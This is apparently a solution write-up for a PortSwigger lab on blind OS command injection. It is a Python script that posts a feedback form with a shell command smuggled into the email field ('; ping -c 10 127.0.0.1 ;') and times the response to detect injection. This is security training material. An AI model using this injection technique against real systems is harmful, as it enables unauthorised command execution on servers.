# Lab: Blind OS command injection with time delays

link to lab: https://portswigger.net/web-security/os-command-injection/lab-simple

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from datetime import datetime


cookies = {
    'session': 'nwRjPYZIF1JHYrv5Dii5MiHpwt1EdV6z',
}

res = requests.get(
    'https://0a5100e7037b5b3ec0232c54008b00a7.web-security-academy.net/feedback',
    cookies=cookies,
    verify=False,
)
soup = BeautifulSoup(res.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print(csrf_token)
send_post = datetime.now()
t1=send_post.strftime("%H:%M:%S")
print(t1)

cookies = {
    'session': 'nwRjPYZIF1JHYrv5Dii5MiHpwt1EdV6z',
}

data = {
    'csrf': '0h7Ws0hU4VlHWnEuMPoWK8tf2fM63MO0',
    'name': 'a',
    'email': 'a@a.a; ping -c 10 127.0.0.1 ; ',
    'subject': 'a',
    'message': 'a',
}

response = requests.post(
    'https://0a5100e7037b5b3ec0232c54008b00a7.web-security-academy.net/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)

print("response: ", response.text)
receive_post=datetime.now()
t2=receive_post.strftime("%H:%M:%S")
print(t2)
print("time: ", receive_post-send_post)
```